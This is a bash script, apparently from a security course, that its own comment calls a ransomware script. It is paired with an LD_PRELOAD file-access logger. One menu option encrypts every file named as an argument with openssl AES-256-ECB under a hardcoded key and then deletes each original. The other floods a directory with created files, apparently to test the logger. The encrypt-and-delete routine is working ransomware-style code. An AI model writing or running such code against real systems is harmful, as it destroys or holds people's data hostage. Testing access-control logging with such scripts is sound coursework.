#!/bin/bash
#Ransomware script for choosing files and encrypting them. Also delete original files
#Creating a big volume of files into specific directory user typed.

echo "1)Encrypting files"
echo "2)Create a big volume of files into directory"
read -p "Enter num 1 or 2 for choosing menu: " choice


if [ $choice -eq 1 ]; then
    for fp in $* 
    do
        echo -e "#include <stdio.h> \n#include <string.h> \n" >test_aclog.c
    
        echo "int main(){" >>test_aclog.c
        echo -e "   FILE *f1,*f2;\n" >>test_aclog.c
        
        #File exists
        if [ -f "$fp" ]; then
            echo "File: $fp exists"

            echo -e "   f1=fopen(\"$fp\",\"r\"); \n   f2=fopen(\"$fp.encrypt\",\"w\");
            \n}" >> test_aclog.c
        
        else #File does not exist
            echo "File: $fp does not exist"

            echo -e "   f1=fopen(\"$fp\",\"w\"); \n   f2=fopen(\"$fp.encrypt\",\"w\"); 
            \n}" >>test_aclog.c
        fi
        #Load our library for executing custom fopen
        gcc test_aclog.c -o test_aclog
        LD_PRELOAD=./logger.so ./test_aclog

        #Encrypt file using our key
        openssl enc -aes-256-ecb -in $fp -out $fp.encrypt -k TUC2018030099
        rm $fp

        #Functionality for decryption provided
        read -p "For decrypting files type d. Else press any key: " dec
        if [ $dec == d ]; then
            openssl aes-256-ecb -in $fp.encrypt -out $fp -d -k TUC2018030099
        fi
    done
elif [ $choice -eq 2 ]; then
 
    for ((i=0; i<$2; i++ ))
    do
        echo -e "#include <stdio.h> \n#include <string.h> \n" >test_aclog.c
    
        echo "int main(){" >>test_aclog.c
        echo -e "   FILE *f1;\n" >>test_aclog.c
        echo -e "   f1=fopen(\"$1/CREATED_FILE_${i}\",\"w\");
        \n}" >>test_aclog.c

        gcc test_aclog.c -o test_aclog
        LD_PRELOAD=./logger.so ./test_aclog
    done
else
    echo "Not valid action"
fi